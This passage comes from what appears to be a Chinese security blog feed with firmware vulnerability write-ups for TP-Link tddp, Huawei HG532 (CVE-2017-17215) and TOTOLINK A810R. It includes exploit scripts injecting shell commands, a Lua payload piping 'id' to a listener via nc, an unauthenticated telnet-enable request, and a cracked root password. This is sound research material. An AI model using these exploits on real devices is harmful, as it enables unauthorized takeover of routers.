!sub_16ACC(&amp;v6)</span><br><span class="line">    &amp;&amp; !sub_16E5C(v6 + 9)</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 2, &amp;optval, 4u)</span><br><span class="line">    &amp;&amp; !sub_16D68(v6[9], 1040)                  // 绑定1040端口</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 6, &amp;v3, 4u) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[11] |= 2u;</span><br><span class="line">    v6[11] |= 4u;</span><br><span class="line">    v6[11] |= 8u;</span><br><span class="line">    v6[11] |= 0x10u;</span><br><span class="line">    v6[11] |= 0x20u;</span><br><span class="line">    v6[11] |= 0x1000u;</span><br><span class="line">    v6[11] |= 0x2000u;</span><br><span class="line">    v6[11] |= 0x4000u;</span><br><span class="line">    v6[11] |= 0x8000u;</span><br><span class="line">    v6[12] = 60;</span><br><span class="line">    v0 = v6;</span><br><span class="line">    v0[13] = sub_9340();                        // 获取时间</span><br><span class="line">    v9 = &amp;readfds;</span><br><span class="line">    for ( i = 0; i &lt;= 0x1F; ++i )</span><br><span class="line">      v9-&gt;__fds_bits[i] = 0;</span><br><span class="line">    nfds = v6[9] + 1;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        timeout.tv_sec = 600;</span><br><span class="line">        timeout.tv_usec = 0;</span><br><span class="line">        readfds.__fds_bits[v6[9] &gt;&gt; 5] |= 1 &lt;&lt; (v6[9] &amp; 0x1F);</span><br><span class="line">        v7 = select(nfds, &amp;readfds, 0, 0, &amp;timeout);</span><br><span class="line">        if ( sub_9340() - v6[13] &gt; v6[12] )</span><br><span class="line">          v6[8] = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v7 == -1 );</span><br><span class="line">      if ( !v7 )</span><br><span class="line">        break;</span><br><span class="line">      if ( ((readfds.__fds_bits[v6[9] &gt;&gt; 5] &gt;&gt; (v6[9] &amp; 0x1F)) &amp; 1) != 0 )</span><br><span class="line">        sub_16418(v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_16E0C(v6[9]);</span><br><span class="line">  sub_16C18(v6);</span><br><span class="line">  return printf(&quot;[%s():%d] tddp task exit\n&quot;, &quot;tddp_taskEntry&quot;, 219);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用socket来实现通讯<br>sub_16D68函数中 绑定了1040端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_16D68(int a1, uint16_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // r3</span><br><span class="line">  struct sockaddr s; // [sp+8h] [bp-14h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, sizeof(s));</span><br><span class="line">  s.sa_family = 2;</span><br><span class="line">  *&amp;s.sa_data[2] = htonl(0);</span><br><span class="line">  *s.sa_data = htons(a2);</span><br><span class="line">  if ( bind(a1, &amp;s, 0x10u) == -1 )</span><br><span class="line">    v2 = sub_13018(-10103, &quot;failed to bind socket&quot;);</span><br><span class="line">  else</span><br><span class="line">    v2 = 0;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时把主机字节序转化成了网络字节序 用来方便不同设备之间的统一通讯<br>随后会进入sub_16418函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" alt="image.png"></a><br>该函数旨在接收1040端口传输来的数据<br>这里注意一下数据包存放的缓冲区地址为 a1+45083 而v2作为一个指针指向该地址<br>对于v2进行了一个检测 如果为1则进入分支<br>这里涉及到了dttp这个协议 其为D-LINK所使用的一种简单的调试协议<br>分为v1和v2两个版本<br>版本号会放在数据包首地址来作为区分<br>随后还会有一个用来表示类型的字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4：CMD_AUTO_TEST   6: CMD_CONFIG_MAC   7: CMD_CANCEL_TEST</span><br><span class="line">8: CMD_REBOOT_FOR_TEST   0XA:CMD_GET_PROD_ID   0XC: CMD_SYS_INIT </span><br><span class="line">0XD: CMD_CONFIG_PIN   0X30: CMD_FTEST_USB   0X31: CMD_FTEST_CONFIG</span><br></pre></td></tr></table></figure><p>也就是我们在sub_15E74函数中所看到的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" alt="image.png"></a><br>这里借用winmt师傅的图来方便理解包的形式<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" alt="image.png"></a><br>ver为版本号 type则为包的类型<br>本次的漏洞出现在0x31对应的类型中 我们找到对应的函数进行跟进<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" alt="image.png"></a><br>其以;进行了正则匹配 将两段字符串分别存储到s和v10中 随后进行了命令执行<br>那么这里仅仅过滤了一个;字符 我们也可以使用|和&amp;来达到任意命令执行的目的<br>上述为第一种漏洞的利用途径 接下来还有一个通过lua脚本达到任意命令执行的洞<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102246660.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102246660.png" alt="image.png"></a><br>可以看到 s是由我们所控制的 其作为一个路径的一部分 用来指向一个lua脚本<br>并且如果这个lua脚本存在 就可以执行这个脚本<br>我们再来看一下原本要执行的指令<br>其为 <strong>tftp -gr xxxx host</strong><br>host为宿主机与虚拟机通信的接口ip<br>我们只需要在宿主机启动tftp服务 随后篡改xxxx为正确的文件名 就可以实现任意脚本执行了</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用readelf可以得到是32位小端序的arm架构 这里使用armhf 不适用armel是因为其缺少硬件浮点数支持<br>搭建脚本:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap1 -u root</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo ifconfig tap1 192.168.6.2</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line"></span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line"></span><br><span class="line">    -kernel ./armhf/vmlinuz-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -initrd ./armhf/initrd.img-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -drive if=sd,file=./armhf/debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line"></span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line"></span><br><span class="line">    -net nic -net tap,ifname=tap1,script=no,downscript=no \</span><br><span class="line"></span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>我这里的硬盘映像文件虽然是直接从官网下的 但是不知道什么原因 在模拟的时候会提示说硬盘大小出现问题<br>所以这里按照描述更改映像文件为32G即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-img resize debian_wheezy_armhf_standard.qcow2 32G</span><br></pre></td></tr></table></figure><p>随后就可以成功启动模拟 进入后将eth0接口更改 使其与tap1位于同一c段<br>随后挂载两个文件夹并且设置squashfs-root为根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line">chroot ./squashfs-root/ sh</span><br></pre></td></tr></table></figure><p>启动tddp程序<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" alt="image.png"></a><br>接着回到宿主机 这里如果直接nc 1040这个端口是无法连接的<br>我们需要借助nmap的udp扫描方式<br>可以看到这个端口是有过滤的<br>等下使用脚本复现的时候也要注意一下socket需要调整为UDP<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" alt="image.png"></a><br>随后在宿主机上安装tftp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install atftpd</span><br></pre></td></tr></table></figure><p>随后需要进行两次配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/xinetd.d/tftp</span><br><span class="line"></span><br><span class="line">service tftp  </span><br><span class="line">&#123;  </span><br><span class="line">socket_type = dgram  </span><br><span class="line">protocol = udp  </span><br><span class="line">wait = yes  </span><br><span class="line">user = root  </span><br><span class="line">server = /usr/sbin/in.tftpd  </span><br><span class="line">server_args = -s /tftpboot -c   这个文件夹我试过放到用户目录下 最后失败了</span><br><span class="line">disable = no  </span><br><span class="line">per_source = 11  </span><br><span class="line">cps = 100 2  </span><br><span class="line">flags = IPv4  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/atftpd</span><br><span class="line"></span><br><span class="line">USE_INETD=false</span><br><span class="line"># OPTIONS below are used only with init script</span><br><span class="line">OPTIONS=&quot;--tftpd-timeout 0  --retry-timeout 0 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot&quot;</span><br></pre></td></tr></table></figure><p>随后更改tftpboot文件夹的权限以及新增一个payload文件 用来执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 /tftpboot</span><br><span class="line">touch payload</span><br><span class="line">sudo vim payload</span><br><span class="line"></span><br><span class="line">function config_test(config)</span><br><span class="line">    os.execute(&quot;id|nc 192.168.6.2 6666&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在虚拟机启动tddp后 使用脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import*</span><br><span class="line"></span><br><span class="line">from sys import*</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.6.3&quot;,1040))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = b&quot;\x01\x31&quot; #版本号和类型</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(12,b&#x27;\x00&#x27;) #填充垃圾数据</span><br><span class="line"></span><br><span class="line">payload += b&quot;|touch a||;aaa&quot;</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" alt="image.png"></a><br>随后我们前往&#x2F;tmp目录 可以找到刚刚创建的a文件 成功进行了任意的命令执行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" alt="image.png"></a><br>接着来尝试第二种方法<br>开启tddp服务以后 执行下列脚本 同时我们需要在宿主机上监听一下6666端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import*</span><br><span class="line"></span><br><span class="line">from sys import*</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.6.3&quot;,1040))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = b&quot;\x01\x31&quot; #版本号和类型</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(12,b&#x27;\x00&#x27;) #填充垃圾数据</span><br><span class="line"></span><br><span class="line">payload += b&quot;/payload;aaa&quot;</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br></pre></td></tr></table></figure><p>使其执行payload文件中的指令<br>随后就可以在6666端口中接收到了id的回显<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310122341208.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310122341208.png" alt="image.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次复现 第一次接触到了协议洞 相比常规的命令执行 协议洞需要先了解清楚协议的数据包构成 才能看懂代码逻辑<br>发掘漏洞的思路还是通过定位execve或者是system这类敏感函数 然后再朔源查看是否存在控制参数的可能性</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE 2017-17215</title>
    <link href="http://example.com/2023/10/07/cve-2017-17215/"/>
    <id>http://example.com/2023/10/07/cve-2017-17215/</id>
    <published>2023-10-07T12:52:47.000Z</published>
    <updated>2023-10-07T13:20:19.160Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>华为HG532部分定制版本存在远程代码执行漏洞 经过身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击 成功利用可能导致远程执行任意代码<br>固件下载地址: <a href="https://archive.org/download/RouterHG532e/router%20HG532e.rar">https://archive.org/download/RouterHG532e/router%20HG532e.rar</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>readelf分析出来是mips32位大端序<br>qemu启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mips -M malta -kernel ./mips_kernel/vmlinux-2.6.32-5-4kc-malta -hda ./mips_kernel/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>接着配置系统模拟的eth0接口为192.168.6.xx<br>随后利用scp上传一下提取出来的squashfs-root文件夹<br>接着需要再开一个终端 ssh连接一下<br>这里是因为&#x2F;bin&#x2F;mic文件的执行过程中会造成eth0接口的静态ip发生变化 所以需要我们利用ssh启动服务 随后在原本的会话中重新配置eth0接口的地址<br>挂载一下相关服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev  </span><br><span class="line">mount -t proc /proc ./squashfs-root/proc/</span><br></pre></td></tr></table></figure><p>开启ssh连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.6.3</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ sh</span><br><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>然后就会卡在这里 返回到qemu启动的那个会话 重新配置一下eth0接口就行了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据官方的漏洞报告 我们可以得知漏洞出现的路径为&#x2F;ctrlt&#x2F;DeviceUpgrade_1 并且出现任意命令执行的参数为NewStatusURL和NewDownloadURL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From looking into the UPnP description of the device, it can be seen that it supports a service type named `DeviceUpgrade`. This service is supposedly carrying out a firmware upgrade action by sending a request to “/ctrlt/DeviceUpgrade_1” (referred to as controlURL ) and is carried out with two elements  named `NewStatusURL` and `NewDownloadURL`.</span><br></pre></td></tr></table></figure><p>利用grep指令可以定位到DeviceUpgrade字符串位于upnp文件中有出现<br>利用NewDownloadURL定位到目标函数 发现直接通过sprintf传参给了system函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_40749C(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // $s1</span><br><span class="line">  const char *v4; // [sp+20h] [-40Ch] BYREF</span><br><span class="line">  const char *v5; // [sp+24h] [-408h] BYREF</span><br><span class="line">  char v6[1028]; // [sp+28h] [-404h] BYREF</span><br><span class="line"></span><br><span class="line">  v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewDownloadURL&quot;, 0, &amp;v4);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewStatusURL&quot;, 0, &amp;v5);</span><br><span class="line">      if ( !v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          snprintf(v6, 1024, &quot;upg -g -U %s -t &#x27;1 Firmware Upgrade Image&#x27; -c upnp -r %s -d -b&quot;, v4, v5);</span><br><span class="line">          system(v6);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个疑惑的点 虽然官方的报告说&#x2F;ctrlt&#x2F;DeviceUpgrade_1是负责固件的更新 但是不管是直接访问 还是抓包固件更新的按钮  我都没有得到访问该路径的包<br>所以只能直接用网上的exp了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">data = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line"></span><br><span class="line"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewStatusURL&gt;;mkdir /bin/hell;&lt;/NewStatusURL&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/u:Upgrade&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/s:Body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/s:Envelope&gt;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">requests.post(&#x27;http://192.168.6.3:37215/ctrlt/DeviceUpgrade_1&#x27;,headers=headers,data=data)</span><br></pre></td></tr></table></figure><p>如果成功执行 那么就会新建一个&#x2F;bin&#x2F;hell文件夹<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" alt="image.png"></a></p><h1 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h1><p>不难看出 漏洞的核心点就在于system函数的参数没有得到限制 如果在实际的漏洞挖掘中<br>应该遍历涉及到system函数的地方 然后看参数是否可控 可控的话参数是否进行了过滤<br>如果可以利用 那么就朔源如何访问到这一函数 随后编写exp</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>TOTOLINK-A810R分析</title>
    <link href="http://example.com/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/</id>
    <published>2023-09-25T02:25:35.000Z</published>
    <updated>2023-09-26T13:39:49.613Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶然间看到了一个cve  是totolink的其他型号 随后发现我手上的这个貌似也存在这个漏洞 于是记录一下自己发掘的过程<br>设备型号:TOTOLINK A810R<br>固件版本: V5.9c.4573_B20191019<br>下载地址: <a href="https://totolink.tw/support_view/A810R">https://totolink.tw/support_view/A810R</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>binwalk提取出文件系统后 老规矩还是来看一下架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" alt="image.png"></a><br>随后就是qemu系统模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>然后上传文件系统 chroot以及启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -oHostKeyAlgorithms=+ssh-dss 1.zip root@192.168.6.3:/</span><br><span class="line">root/</span><br><span class="line">chroot ./squashfs-root /bin/sh</span><br><span class="line">./bin/lighttpd -f lighttp/lighttpd.conf  -m lighttp/lib/</span><br></pre></td></tr></table></figure><p>但是由于totolink的管理界面 常规的浏览器是不支持的 需要ie浏览器<br>但是linux安装ie浏览器过于麻烦 所以我直接闲鱼花30买了个真机用来复现</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先使用firmwalker来看一下文件系统中有什么可以利用的地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh ../iot/_TOTOLINK_A810R_V5.9c.4573_B20191019.web.extracted/squashfs-root ./firmwalker.txt</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" alt="image.png"></a><br>可以看到 存在着telnet服务 我们访问一下这个网页 看看有什么功能<br>访问后直接跳转到了登录界面<br>由于这里我们已经知道了用户密码 所以先登录进去<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" alt="image.png"></a><br>可以看到就是一个功能简单的 设置是否开启telnet服务的页面<br>这里直接使用burp来看一下按下apply按钮后发送的包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 60</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://192.168.0.1/telnet.asp?timestamp=1695703177052</span><br><span class="line">Cookie: SESSION_ID=2:1571586185:2</span><br><span class="line"></span><br><span class="line">&#123;&quot;telnet_enabled&quot;:&quot;1&quot;,</span><br><span class="line">&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向cstecgi.cgi进行了一个post请求<br>包含了一个json表单 一个有两个参数 telnet_enabled和topicurl<br>前者应该是用来控制是否开启telnet服务 而后者应该是用来决定处理方式<br>因为利用浏览器的开发者工具 可以捕捉到一个包的参数为 “topicurl”:”setting&#x2F;getTelnetCfg”<br>同时我们观察一下包的内容  可以发现其实对于是否登录并没有进行检测<br>我们凭借这个poc就可以做到越权开启telnet服务<br>扫描端口发现开在了23<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" alt="image.png"></a><br>尝试nc连接发现需要账号密码<br>而我们最开始使用firmwalker是扫描到了密码的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" alt="image.png"></a><br>打开看看这三个文件 发现是空的 不过紧邻着etc&#x2F;shadow的shadow.example存放着root用户的md5加密后的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::</span><br><span class="line">nobody:*:0:0:99999:7:::</span><br></pre></td></tr></table></figure><p>解密后发现是cs2012<br>随后成功连接上路由器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" alt="image.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2022-26258</title>
    <link href="http://example.com/2023/09/23/CVE-2022-26258/"/>
    <id>http://example.com/2023/09/23/CVE-2022-26258/</id>
    <published>2023-09-23T07:21:25.000Z</published>
    <updated>2023-09-23T15:29:37.253Z</updated>
    
